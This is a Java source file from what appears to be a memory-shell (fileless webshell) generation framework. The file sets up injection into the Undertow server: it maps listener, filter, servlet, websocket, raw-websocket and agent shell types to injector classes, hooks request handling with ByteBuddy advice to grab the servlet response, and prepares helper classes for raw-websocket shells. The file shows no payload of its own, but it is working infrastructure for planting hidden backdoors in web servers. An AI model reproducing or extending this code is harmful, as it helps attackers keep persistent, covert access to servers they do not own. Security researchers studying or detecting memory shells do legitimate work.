package com.reajason.javaweb.memshell.server.undertow;

import com.reajason.javaweb.memshell.obfuscation.MethodContracts;
import com.reajason.javaweb.memshell.obfuscation.MethodSignature;
import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.memshell.server.InjectorMapping;
import java.util.Set;

import com.reajason.javaweb.memshell.RawWsHelperNames;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;

import java.util.Map;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/10
 */
public class Undertow extends AbstractServer {

    public static class ListenerInterceptor {

        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false) Object response) throws Exception {
            Map<?, ?> map = (Map<?, ?>) ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "exchange"), "attachments");
            Object[] keys = map.keySet().toArray();
            for (Object key : keys) {
                if (map.get(key).toString().contains("ServletRequestContext")) {
                    response = ShellCommonUtil.getFieldValue(map.get(key), "servletResponse");
                    break;
                }
            }
        }
    }

    @Override
    public Class<?> getListenerInterceptor() {
        return ListenerInterceptor.class;
    }

    @Override
    public Set<MethodSignature> getShellMethodContracts(String shellType) {
        if (HANDLER.equals(shellType) || JAKARTA_HANDLER.equals(shellType)) {
            return MethodContracts.UNDERTOW_HANDLER_CONTRACTS;
        }
        return super.getShellMethodContracts(shellType);
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, "com.reajason.javaweb.memshell.injector.undertow.UndertowListenerInjector")
                .addInjector(JAKARTA_LISTENER, "com.reajason.javaweb.memshell.injector.undertow.UndertowListenerInjector")
                .addInjector(FILTER, "com.reajason.javaweb.memshell.injector.undertow.UndertowFilterInjector")
                .addInjector(JAKARTA_FILTER, "com.reajason.javaweb.memshell.injector.undertow.UndertowFilterInjector")
                .addInjector(WEBSOCKET, "com.reajason.javaweb.memshell.injector.undertow.UndertowWebSocketInjector")
                .addInjector(JAKARTA_WEBSOCKET, "com.reajason.javaweb.memshell.injector.undertow.UndertowWebSocketInjector")
                .addInjector(SERVLET, "com.reajason.javaweb.memshell.injector.undertow.UndertowServletInjector")
                .addInjector(JAKARTA_SERVLET, "com.reajason.javaweb.memshell.injector.undertow.UndertowServletInjector")
                .addInjector(RAW_WEBSOCKET, "com.reajason.javaweb.memshell.injector.undertow.UndertowRawWsInjector")
                .addInjector(JAKARTA_RAW_WEBSOCKET, "com.reajason.javaweb.memshell.injector.undertow.UndertowRawWsInjector")
                .addInjector(UNDERTOW_AGENT_SERVLET_HANDLER, "com.reajason.javaweb.memshell.injector.undertow.UndertowServletHandlerAgentInjector")
                .build();
    }

    /**
     * Undertow 的连接器是 XNIO StreamConnection，RawWebSocket 通过
     * {@code HttpServerExchange.upgradeChannel} 在 101 响应后接管连接；
     * 注入器需要先 defineClass 按 shell 类名派生的 helper。
     */
    @Override
    public byte[] postProcessShellBytes(byte[] shellBytes, ShellConfig shellConfig,
                                        ShellToolConfig shellToolConfig, InjectorConfig injectorConfig) {
        if (RAW_WEBSOCKET.equals(shellConfig.getShellType())
                || JAKARTA_RAW_WEBSOCKET.equals(shellConfig.getShellType())) {
            String helperClassName = RawWsHelperNames.helperClassName(shellToolConfig.getShellClassName());
            injectorConfig.setHelperClassBytes(UndertowRawWsHelperGenerator.getBytes(helperClassName, shellConfig));
        }
        return shellBytes;
    }
}
